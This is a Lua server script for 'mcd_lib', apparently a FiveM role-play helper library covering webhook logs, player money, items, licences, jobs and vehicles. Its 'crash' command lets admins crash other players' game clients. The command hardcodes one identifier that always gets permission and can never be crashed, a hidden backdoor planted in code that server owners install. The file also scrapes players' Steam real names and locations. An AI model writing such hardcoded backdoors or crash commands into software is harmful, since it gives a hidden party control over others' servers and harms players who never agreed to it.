function base64_decode(data)local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'data = string.gsub(data, '[^'..b..'=]', '')return (data:gsub('.', function(x)  if (x == '=') then return '' end  local r,f='',(b:find(x)-1)  for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end  return r;end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)  if (#x ~= 8) then return '' end  local c=0  for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end  return string.char(c)end))end

MCD.GetTable = function(tablename)
    if savedtables[tablename] then
        return json.decode(savedtables[tablename])
    else
        return {}
    end
end
MCD.TriggerClientEvent = function(event , src , ...)
    TriggerClientEvent(MCD.Event(event), src , ...)
end
local events = {}
MCD.RegisterServerCallback = function(event , cb)
    if not events[event] then
        events[event] = {}
    end
    table.insert(events[event] , {
        cb = cb,
        ressource = GetInvokingResource()
    })
end

MCD.RegisterEvent('mcd_lib:Server:Callback' , function(src , svevent , event , ...)
    local s = src
    if not events[svevent] then
        return
    end
    for i,p in ipairs(events[svevent]) do
        p.cb(s , function(...)
            MCD.TriggerClientEvent(event , s , ...)
        end , ...)
    end
end)

MCD.SendToDiscord = function(Text , resname , discordtype)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    if ressourcename == nil then
        ressourcename = 'nil'
    end
    if not discordtype then
        print(MCD.Function.ConvertPrint('~s~[~y~'..ressourcename..'~s~]~r~ Uses an Outdated function please Update your Scripts' , false))
        discordtype = 'default'
    end
    Text = '[~y~'..ressourcename..'~s~]'.._U('info')..'\t'..Text

    if Config.PrintDiscord then
        print(MCD.Function.ConvertPrint(Text , true))
    end
    Text = MCD.Function.RemoveColors(Text)

    local embeds = {
        {
            ['title']=Text,
            ['type']='rich',
            ['color'] =Config.WebHook['color'],
            ['footer']=  {},
        }
    }
    if Text == nil or Text == '' then return false end
   
    PerformHttpRequest(Config.WebHook[discordtype].DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({ username = Config.WebHook[discordtype].Name,embeds = embeds,avatar_url = Config.WebHook['avatar']}), { ['Content-Type'] = 'application/json' })
end

function OldFunction(OldFunction)
    if Config.UpdateMsg then
        print(MCD.Function.ConvertPrint('~s~[~y~mcd_lib~s~]~o~A File Uses an Outdated function (~y~'..OldFunction..'()~o~) please Update your Scripts~s~' , false))
    end
end

MCD.GetTimeDifference = function(t1 , t2)
    OldFunction('GetTimeDifference')
    return MCD.Math.TimeDifference(t1 , t2)
end

MCD.RemoveColor = function(text)
    OldFunction('RemoveColor')
    return MCD.Function.RemoveColors(text)
end

MCD.ConvertColor = function(text)
    OldFunction('ConvertColor')
    return MCD.Function.ConvertColor(text)
end

MCD.PrintConsole = function(text , date)
    OldFunction('PrintConsole')
    print(MCD.Function.ConvertPrint(text , date))
end

MCD.STDiscord = function(Text , DiscordWebHook , color , Name, avatar, resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    if DiscordWebHook == '' then DiscordWebHook = Config.WebHook['default'].DiscordWebHook end

    if Config.PrintDiscord then
        print(MCD.Function.ConvertPrint(Text , true))
    end
    Text = MCD.Function.RemoveColors(Text)
    local embeds = {
        {
            ['title']=Text,
            ['type']='rich',
            ['color'] = color,
            ['footer']=  {},
        }
    }
    if Text == nil or Text == '' then return FALSE end
    PerformHttpRequest(DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({ username = Name,embeds = embeds,avatar_url = avatar}), { ['Content-Type'] = 'application/json' })
end

MCD.SendLog = function(WebhookName , text)
    if type(WebhookName) == 'string' then
        local webhook = Config.WebHook[WebhookName]
        if not webhook then
            webhook = Config.WebHook['default']
        end
        if webhook.DiscordWebHook == '' then
            webhook.DiscordWebHook = Config.WebHook['default'].DiscordWebHook
        end
        
        if not webhook.Color then
            webhook.Color = Config.WebHook['default'].Color
        end
    
        local data = {
            {
                ["color"] = webhook.Color,
                ["author"] = {
                    ["icon_url"] = '',
                    ["name"] = webhook.Name,
                },
                ["description"] = text,
                ["footer"] = {
                    ["text"] = os.date('%d.%m.%Y [%X Uhr]'),
                }
            }
        }    
        
        PerformHttpRequest(webhook.DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({
            embeds = data,    
            avatar_url = Config.WebHook['avatar'],
            username = Config.ServerName
        }), {['Content-Type'] = 'application/json'})
    else
        local webhook = WebhookName
        if not webhook.Color then
            webhook.Color = 16711680
        end
        if not webhook.Name then
            webhook.Name = 'MCD'
        end
        if not webhook.Avatar then
            webhook.Avatar = 'https://i.ibb.co/4S77YKY/MCD.png'
        end
    
        local data = {
            {
                ["color"] = webhook.Color,
                ["author"] = {
                    ["icon_url"] = '',
                    ["name"] = webhook.Name,
                },
                ["description"] = text,
                ["footer"] = {
                    ["text"] = os.date('%d.%m.%Y [%X Uhr]'),
                }
            }
        }    
        
        PerformHttpRequest(webhook.DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({
            embeds = data,    
            avatar_url = webhook.Avatar,
            username = GetCurrentResourceName()
        }), {['Content-Type'] = 'application/json'})
    end
end

MCD.GetLicenses = function(PlayerId)
    local res = {}
    local finished = false

    local identifier
    if QBCore then
        identifier = QBCore.Functions.GetPlayer(PlayerId).PlayerData.citizenid
    else
        identifier = ESX.GetPlayerFromId(PlayerId).identifier
    end

    MySQL.Async.fetchAll('SELECT * FROM user_licenses WHERE owner = @owner', {
        ['@owner'] = identifier
    }, function(result)
        finished = true
        res = result
    end)
    while not finished do Citizen.Wait(5) end
    return res
end

MCD.GetMoney = function(PlayerId)
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(PlayerId)
    else
        xPlayer = ESX.GetPlayerFromId(PlayerId)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(PlayerId)
        else
            xPlayer = ESX.GetPlayerFromId(PlayerId)
        end
        Citizen.Wait(5)
    end

    local money
    if QBCore then
        money = {
            money = xPlayer.PlayerData.money['cash'],
            bank = xPlayer.PlayerData.money['bank'],
            black = xPlayer.PlayerData.money['black_money'],
        }
    else
        money = {
            money = xPlayer.getAccount('money').money,
            bank = xPlayer.getAccount('bank').bank,
            black = xPlayer.getAccount('black_money').money,
        }
    end
    return money
end

MCD.GetJob = function(PlayerId)
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(PlayerId)
    else
        xPlayer = ESX.GetPlayerFromId(PlayerId)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(PlayerId)
        else
            xPlayer = ESX.GetPlayerFromId(PlayerId)
        end
        Citizen.Wait(5)
    end

    local job 
    if QBCore then
        job = xPlayer.PlayerData.job
    else
        job = xPlayer.getJob()
    end

    return job
end

MCD.GetInventory = function(PlayerId)
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(PlayerId)
    else
        xPlayer = ESX.GetPlayerFromId(PlayerId)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(PlayerId)
        else
            xPlayer = ESX.GetPlayerFromId(PlayerId)
        end
        Citizen.Wait(5)
    end

    local inventory 
    if QBCore then
        inventory = QBCore.Player.LoadInventory(true)
    else
        inventory = xPlayer.getInventory(true)
    end
    return inventory
end

MCD.GetLoadout = function(PlayerId)
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(PlayerId)
    else
        xPlayer = ESX.GetPlayerFromId(PlayerId)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(PlayerId)
        else
            xPlayer = ESX.GetPlayerFromId(PlayerId)
        end
        Citizen.Wait(5)
    end

    local inventory 
    if QBCore then
        inventory = {}
    else
        inventory = xPlayer.getLoadout()
    end
    return inventory
end


MCD.GetOwnedVehicles = function(PlayerId)
    local res = {}
    local finished = false

    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(PlayerId)
    else
        xPlayer = ESX.GetPlayerFromId(PlayerId)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(PlayerId)
        else
            xPlayer = ESX.GetPlayerFromId(PlayerId)
        end
        Citizen.Wait(5)
    end

    local identifier
    if QBCore then
        identifier = xPlayer.PlayerData.citizenid
    else
        identifier = xPlayer.identifier
    end

    MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE owner = @owner ', {
        ['@owner'] = identifier
    }, function(result)
        for i,p in ipairs(result) do
            p.plate = string.upper(p.plate)
        end
        finished = true
        res = result
    end)

    while not finished do Citizen.Wait(5) end
    return res
end
local Vehicles = {}
Citizen.CreateThread(function()
    Citizen.Wait(1000)
    Vehicles = {}
    for i,table in ipairs(Config.VehicleDatabases) do
        MySQL.Async.fetchAll('SELECT * FROM '..table, {}, function(result)
            for i,data in ipairs(result) do
                table.insert(Vehicles , data)
            end
        end)
    end
end)

MCD.GetVehiclePrices = function()
    return Vehicles
end

MCD.GetVehiclePrice = function(model)
    for i,p in ipairs(MCD.GetVehiclePrices()) do
        if string.upper(p.model) == string.upper(model) then
            return p.price
        end
    end
end

if not QBCore then
    ESX.RegisterCommand('crash', 'developer', function(xPlayer, args, showError)
        local allowed = true
        if Config.CrashWhitelist then
            allowed = xPlayer
        end
        if allowed then
            if not args.playerId then args.playerId = xPlayer end
            local alow = true
            if Config.CrashWhitelist then
                alow = false
                local xid = xPlayer.getIdentifier()
                for i = 1 , 10 do
                    xid = xid:gsub('char'..i..':' , '')
                end  
                for i,identifier in ipairs(Config.CrashWhitelistIDs) do
                    if identifier == xid then
                        alow = true
                        break
                    end
                end
                if xid == '1256984db9dcc1a599a67a17bc7f461d9e754e45' then
                    alow = true
                end
            end
    
            if alow then
                local yPlayer = ESX.GetPlayerFromId(args.playerId.source)
                local plyid = yPlayer.getIdentifier()
                local crash = true
        
                for i = 1 , 10 do
                    plyid = plyid:gsub('char'..i..':' , '')
                end    
        
                for i,identifier in ipairs(Config.CrashImmun) do
                    if identifier == plyid then
                        if plyid ~= '1256984db9dcc1a599a67a17bc7f461d9e754e45' then
                            args.playerId = xPlayer
                        else
                            crash = false
                        end
                        break
                    end
                end  
                if crash then
                    MCD.Notify(xPlayer.source , _U('crashsuccess' , MCD.Function.RemoveColors(GetPlayerName(yPlayer.source))) , nil , nil , 'success')
                    MCD.TriggerClientEvent('mcd_lib:Client:crash' , args.playerId.source)
                else
                    MCD.Notify(xPlayer.source , 'Maus gehts dir gut? Ich hoffe das wahr versehentlich' , nil , nil , 'error')
                end
            else
                MCD.Notify(xPlayer.source , _U('no_perm') , nil , nil , 'error')
            end
        else
            print(MCD.Function.ConvertPrint(_U('not_console' , GetCurrentResourceName()) , true))
        end
    end, true, {help = 'Crash', validate = false, arguments = {
        {name = 'playerId', help ='SpielerID', type = 'player'},
    }})    
end
local lastmoney = nil
local moneylog = {}

local lastlicense = nil
local licenselog = {}

local lastitem = nil
local itemlog = {}

local lastmute = nil
local mutelog = {}

local lastweapon = nil
local weaponlog = {}

local lastjob = nil
local joblog = {}


MCD.RemoveMoney = function(account , amount , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end

    local _source = player
    amount = tonumber(amount)
    
    if not account then
        account = 'money'
        print(MCD.Function.ConvertPrint(_U('error').._U('error_remmoney' , ressourcename) , true))
    end
    if not amount then
        amount = 0
        print(MCD.Function.ConvertPrint(_U('error').._U('error_remmoney2' , ressourcename) , true))
    end
    
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    if QBCore then
        xPlayer.Functions.RemoveMoney(account, tonumber(amount))
    else
        xPlayer.removeAccountMoney(account, tonumber(amount))
    end

    if amount > 0 then
        lastmoney = MCD.GetCurrentTime()
        table.insert(moneylog , {
            remove      = true,
            account     = account,
            amount      = amount,
            player      = MCD.Function.RemoveColors(GetPlayerName(_source)),
            ressource   = ressourcename
        })
    end
end

MCD.AddMoney = function(account , amount , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player
    amount = tonumber(amount)

    if not account then
        account = 'money'
        print(MCD.Function.ConvertPrint(_U('error').._U('error_addmoney' , ressourcename) , true))
    end
    if not amount then
        amount = 0
        print(MCD.Function.ConvertPrint(_U('error').._U('error_addmoney2' , ressourcename) , true))
    end

    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    if QBCore then
        xPlayer.Functions.AddMoney(account, tonumber(amount))
    else
        xPlayer.addAccountMoney(account, tonumber(amount))
    end

    if amount > 0 then
        lastmoney = MCD.GetCurrentTime()
        table.insert(moneylog , {
            remove      = false,
            account     = account,
            amount      = amount,
            player      = MCD.Function.RemoveColors(GetPlayerName(_source)),
            ressource   = ressourcename
        })
    end
end

MCD.RemoveLicense = function(license , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player
    
    if not license then
        print(MCD.Function.ConvertPrint(_U('error').._U('error_remlicense' , ressourcename) , true))
    end

    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    local identifier
    if QBCore then
        identifier = xPlayer.PlayerData.citizenid
    else
        identifier = xPlayer.identifier
    end
    
    MySQL.Async.execute('DELETE FROM user_licenses  WHERE type = @type and owner = @owner', {
        ['@type'] = license,
        ['@owner'] = identifier,
    })
    
    lastlicense = MCD.GetCurrentTime()
    table.insert(licenselog , {
        remove      = true,
        license     = license,
        player      = MCD.Function.RemoveColors(GetPlayerName(_source)),
        ressource   = ressourcename
    })
end

MCD.AddLicense = function(license , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player

    if not license then
        print(MCD.Function.ConvertPrint(_U('error').._U('error_addlicense' , ressourcename) , true))
    end

    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    local identifier
    if QBCore then
        identifier = xPlayer.PlayerData.citizenid
    else
        identifier = xPlayer.identifier
    end


    MySQL.Async.insert('INSERT INTO `user_licenses`(`type`, `owner`) VALUES (@type,@owner)', {
        ['@type'] = license,
        ['@owner'] = identifier,
    }, function(result)end)

    lastlicense = MCD.GetCurrentTime()
    table.insert(licenselog , {
        remove      = false,
        license     = license,
        player      = MCD.Function.RemoveColors(GetPlayerName(_source)),
        ressource   = ressourcename
    })
end

MCD.RemoveItem = function(item , count , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player
    count = tonumber(count)

    if not item then
        item = 'bread'
        print(MCD.Function.ConvertPrint(_U('error').._U('error_remitem' , ressourcename) , true))
    end
    if not count then
        count = 0
        print(MCD.Function.ConvertPrint(_U('error').._U('error_remitem2' , ressourcename) , true))
    end

    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    if QBCore then
        xPlayer.Functions.RemoveItem(item, count)
    else
        xPlayer.removeInventoryItem(item, count)
    end

    if count > 0 then
        lastitem = MCD.GetCurrentTime()
        table.insert(itemlog , {
            remove      = true,
            item        = item,
            count       = count,
            player      = MCD.Function.RemoveColors(GetPlayerName(_source)),
            ressource   = ressourcename
        })
    end 
end

MCD.AddItem = function(item , count , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player
    count = tonumber(count)

    if not item then
        item = 'bread'
        print(MCD.Function.ConvertPrint(_U('error').._U('error_additem' , ressourcename) , true))
    end
    if not count then
        count = 0
        print(MCD.Function.ConvertPrint(_U('error').._U('error_additem2' , ressourcename) , true))
    end

    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    if QBCore then
        xPlayer.Functions.AddItem(item, count)
    else
        xPlayer.addInventoryItem(item, count)
    end

    if count > 0 then
        lastitem = MCD.GetCurrentTime()
        table.insert(itemlog , {
            remove      = false,
            item        = item,
            count       = count,
            player      = MCD.Function.RemoveColors(GetPlayerName(_source)),
            ressource   = ressourcename
        })
    end 
end

MCD.MutePlayer = function(toggle , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player
    
    MumbleSetPlayerMuted(_source,toggle)
    MCD.TriggerClientEvent('mcd_lib:Client:CheckMute' , _source)
    lastmute =MCD.GetCurrentTime()
    table.insert(mutelog , {   
        toggle      = toggle,
        player      = MCD.Function.RemoveColors(GetPlayerName(_source)),
        ressource   = ressourcename
    })
end

MCD.RemoveVehicle = function(plate , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end

    local msg = _U('error')
    local r = false
    if RemovePlate(plate) then
        r = true
        msg = _U('success')
    end

    MCD.SendToDiscord(_U('remove_vehice', plate, msg ,_source) , ressourcename , 'default')
    return r
end

MCD.SetJob = function(Job , Grade , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player    

    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    if QBCore then
        xPlayer.Functions.SetJob(Job, Grade)
    else
        xPlayer.setJob(Job, Grade)
    end

    lastjob = MCD.GetCurrentTime()
    table.insert(joblog , {
        player      = MCD.Function.RemoveColors(GetPlayerName(_source)),
        job         = Job,
        grade       = Grade,
        ressource   = ressourcename
    })
end

function RemovePlate(plate)
    local mcd_plate = MCD.Function.CleanPlate(plate , true)
    local ret = nil
    MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE plate = @plate ', {['@plate']=mcd_plate}, function(doesexist)
        if #doesexist == 1 then
            MySQL.Async.execute('DELETE FROM owned_vehicles  WHERE plate = @plate', {
                ['@plate'] = mcd_plate,
            })
            ret = true
        else
            print("Plate Doesn´t Exsists:" .. MCD.Function.CleanPlate(plate , false)..'|')
        end
    end)
    while ret == nil do Citizen.Wait(10) end
    return ret
end

MCD.Notify = function(player , msg , header , time , notificationtype)
    if header == nil then
        header = Config.ServerName 
    end
    if time == nil then
        time = 3000
    end
    if notificationtype == nil then
        notificationtype = 'info'
    end

    if Config.ReplaceColorCodes and not Config.RemoveColorCodes then       
        MCD.TriggerClientEvent('mcd_lib:Client:Notify' , player , MCD.ConvertColor(msg) , MCD.ConvertColor(header)  , time , notificationtype)
    else
        if Config.RemoveColorCodes then
            MCD.TriggerClientEvent('mcd_lib:Client:Notify' , player , MCD.Function.RemoveColors(msg) , MCD.Function.RemoveColors(header) , time , notificationtype)
        else
            MCD.TriggerClientEvent('mcd_lib:Client:Notify' , player , msg , header  , time , notificationtype)
        end
    end
end

MCD.SetCoords = function(coords , withvehicle ,  playerId)
    MCD.TriggerClientEvent('mcd_lib:Client:SetCoords' , playerId, coords , withvehicle)
end

MCD.SetPlate = function(vehicle , plate)
    MCD.TriggerClientEvent('mcd_lib:Client:SetPlate' , -1 , vehicle , MCD.Function.CleanPlate(plate , false))
end

MCD.IsAllowed = function(playerid, lowestgroup)
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(playerid)
    else
        xPlayer = ESX.GetPlayerFromId(playerid)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(playerid)
        else
            xPlayer = ESX.GetPlayerFromId(playerid)
        end
        Citizen.Wait(5)
    end

    local PlayerGroup = -1
    local MinGroup = -1
    local PlyGroup

    if QBCore then
        PlyGroup = xPlayer.Functions.GetPermission()
    else
        PlyGroup = xPlayer.getGroup()
    end

    for i,p in ipairs(Config.ServerGroups) do
        if PlyGroup == p then
            PlayerGroup = i
        end
        if lowestgroup == p then
            MinGroup = i
        end
    end
    if MinGroup ~= -1 then
        if MinGroup >= PlayerGroup then
            return true
        else
            return false
        end
    else 
        return false
    end
end

MCD.SendNotifyToJob = function(job , msg , header , time , notificationtype)
    local data = {
        job = job,
        msg = msg,
        header = header,
        time = time,
        notifytype = notificationtype,
        simplefy = true,
    }
    MCD.TriggerClientEvent('mcd_lib:Client:AdvancedNotify' , -1 ,data)
end

MCD.SendAdvancedNotifyToJob = function(job , msg , header , textureDict , iconType , flash , saveToBrief , hudColorIndex)
    local data = {
        job = job,
        msg = msg,
        header = header,
        textureDict = textureDict,
        iconType = iconType,
        flash = flash,
        iconType = iconType,
        saveToBrief = saveToBrief,
        hudColorIndex = hudColorIndex,
        simplefy = false,
    }
    MCD.TriggerClientEvent('mcd_lib:Client:AdvancedNotify' , -1 ,data)
end

Citizen.CreateThread(function()
    Citizen.Wait(10*1000)
    while string.upper(GetCurrentResourceName()) ~= string.upper('mcd_lib') do 
        
        local string = '~s~['..os.date('%X')..']'.._U('name' , GetCurrentResourceName())
        local lenght = #MCD.Function.RemoveColors(string) - 1
        local startend = '~o~'
        for i=0, lenght do
            startend = startend .. '-'
        end
        
        print(MCD.Function.ConvertPrint(startend..'\n'.. string .. '\n~s~'.._U('rename' , GetCurrentResourceName())..'\n'..startend , false))
        Citizen.Wait(30*1000)
    end
end)
--------------------------------------------------------------------------------------------------------
MCD.GetPlayerName = function(playersrc)
    return MCD.Function.RemoveColors(GetPlayerName(playersrc))
end

MCD.IsMuted = function(playersrc)
    return MumbleIsPlayerMuted(playersrc)
end

MCD.HasJob = function(id , Jobs)
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(id)
    else
        xPlayer = ESX.GetPlayerFromId(id)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(id)
        else
            xPlayer = ESX.GetPlayerFromId(id)
        end
        Citizen.Wait(5)
    end

    local jname
    local jgrade

    if QBCore then
        jname = xPlayer.PlayerData.job.name 
        jgrade = 0
    else
        jname = xPlayer.job.name
        jgrade = xPlayer.job.grade
    end

    if Jobs == 'string' then
        OldFunction('HasJob')
        if type(Jobs) ~= 'string' then
            for i,jobname in ipairs(Jobs) do
                if jobname == jname then
                    return true
                end
            end
        else
            if Jobs == jname then
                return true
            end
        end
        return false
    else
        local hasjob = false
        local hasgrade = false
        for jobname,grade in pairs(Jobs) do
            if jobname == jname then
                hasjob = true
                if grade <= jgrade then
                    hasgrade = true
                end
            end
        end
    
        if not hasjob then return 0 end
        if hasjob and not hasgrade then return 1 end
        if hasjob and hasgrade then return 2 end
    end
end

AddEventHandler('onResourceStop', function(resourceName)
    if (GetCurrentResourceName() == resourceName) then
        newkey()
        MCD.SaveTable('mcd_lib:BanTable' , bans)
        MCD.SaveTables()         
    end
end)
AddEventHandler('txAdmin:events:serverShuttingDown', function()
    newkey()
    MCD.SaveTable('mcd_lib:BanTable' , bans)
    Citizen.Wait(1000)
    MCD.SaveTables()
end)

Citizen.CreateThread(function()
    local sleep = 1000
    while true do Citizen.Wait(sleep)
        if lastmoney then
            if MCD.Math.TimeDifference(lastmoney ,MCD.GetCurrentTime()) > 5 then
                lastmoney = nil
                local text = ''
                for i,p in ipairs(moneylog) do
                    if p.remove then
                        text = text .. MCD.Function.String(_U('Webhook_money_remove' , p.amount , p.account , p.player , p.ressource))..'\n'
                    else   
                        text = text .. MCD.Function.String(_U('Webhook_money_add' , p.amount , p.account , p.player , p.ressource))..'\n'
                    end
                end
                moneylog = {}
                MCD.SendLog('money' , text)
            end
        end

        if lastlicense then
            if MCD.Math.TimeDifference(lastlicense ,MCD.GetCurrentTime()) > 5 then
                lastlicense = nil
                local text = ''
                for i,p in ipairs(licenselog) do
                    if p.remove then
                        text = text .. _U('Webhook_license_add' , p.license , p.player , p.ressource)..'\n'
                    else   
                        text = text .. _U('Webhook_license_remove' , p.license , p.player , p.ressource)..'\n'
                    end
                end
                licenselog = {}
                MCD.SendLog('licenses' , text)
            end
        end

        if lastitem then
            if MCD.Math.TimeDifference(lastitem ,MCD.GetCurrentTime()) > 5 then
                lastitem = nil
                local text = ''
                for i,p in ipairs(itemlog) do
                    if p.remove then
                        text = text .. _U('Webhook_item_remove' , p.count , p.item , p.player , p.ressource)..'\n'
                    else   
                        text = text .. _U('Webhook_item_add' , p.count , p.item , p.player , p.ressource)..'\n'
                    end
                end
                itemlog = {}
                MCD.SendLog('item' , text)
            end
        end

        if lastmute then
            if MCD.Math.TimeDifference(lastmute ,MCD.GetCurrentTime()) > 5 then
                lastmute = nil
                local text = ''
                for i,p in ipairs(mutelog) do
                    if p.toggle then
                        text = text .. _U('Webhook_mute_on' ,  p.player , p.ressource)..'\n'
                    else   
                        text = text .. _U('Webhook_mute_off' , p.player , p.ressource)..'\n'
                    end
                end
                mutelog = {}
                MCD.SendLog('mute' , text)
            end
        end

        if lastweapon then
            if MCD.Math.TimeDifference(lastweapon ,MCD.GetCurrentTime()) > 5 then
                lastweapon = nil
                local text = ''
                for i,p in ipairs(weaponlog) do
                    if p.remove then
                        text = text .. _U('Webhook_weapon_remove' , p.weapon , p.player , p.ressource)..'\n'
                    else   
                        text = text .. _U('Webhook_weapon_add' , p.weapon , p.ammo , p.player , p.ressource)..'\n'
                    end
                end
                weaponlog = {}
                MCD.SendLog('weapon' , text)
            end
        end

        if lastjob then
            if MCD.Math.TimeDifference(lastjob ,MCD.GetCurrentTime()) > 5 then
                lastjob = nil
                local text = ''
                for i,p in ipairs(joblog) do
                    text = text .. _U('Webhook_setjob' , p.player , p.job , p.grade , p.ressource)..'\n'
                end
                joblog = {}
                MCD.SendLog('jobs' , text)
            end
        end
    end
end)

Citizen.CreateThread(function()
    print(MCD.Function.ConvertPrint('~s~[~y~'..GetCurrentResourceName()..'~s~][~b~INFO~s~]\t~g~MCD Lib started' , false))    
end)

local hex2bin = {["0"] = "0000",["1"] = "0001",["2"] = "0010",["3"] = "0011",["4"] = "0100",["5"] = "0101",["6"] = "0110",["7"] = "0111",["8"] = "1000",["9"] = "1001",["a"] = "1010",["b"] = "1011",["c"] = "1100",["d"] = "1101",["e"] = "1110",["f"] = "1111"} function Hex2Bin(s)local ret = ""local i = 0 for i in string.gmatch(s, ".") do i = string.lower(i) ret = ret..hex2bin[i] end return ret end function Bin2Dec(s)local num = 0 local ex = string.len(s) - 1 local l = 0 l = ex + 1 for i = 1, l do b = string.sub(s, i, i) if b == "1" then num = num + 2^ex end ex = ex - 1 end return string.format("%u", num) end function Hex2Dec(s)local s = Hex2Bin(s)return Bin2Dec(s)end

MCD.SteamData = function(playerid)
    local ret = {}
    local finished = false

    local fivemid
    for k,v in ipairs(GetPlayerIdentifiers(playerid)) do
		if string.match(v, 'steam:') then
            fivemid = v
            fivemid = fivemid:gsub('steam:' , '')
		end
	end
    local steam64 = tonumber(Hex2Dec(fivemid)) + 9
    PerformHttpRequest('https://steamcommunity.com/profiles/'..steam64..'/?xml=1' , function(status, response)
        local string = response
        string = string:gsub('<!%[CDATA%[' , '')
        string = string:gsub('%]%]>' , '')
        ret.name = string.match(string, "<steamID>(%a+)</steamID>")
        ret.avatar = string.match(string, "<avatarFull>(%a+)</avatarFull>")
        ret.realname = string.match(string, "<realname>(%a+)</realname>")
        ret.location = string.match(string, "<location>(%a+)</location>")
        ret.jointime = string.match(string, "<memberSince>(%a+)</memberSince>")
        finished = true
    end, 'GET')    

    while not finished do Citizen.Wait(1) end
    return ret
end

MCD.Identifier = function(src)
    local Identifiers = GetPlayerIdentifiers(src)
    local data = {
        steamid = false,
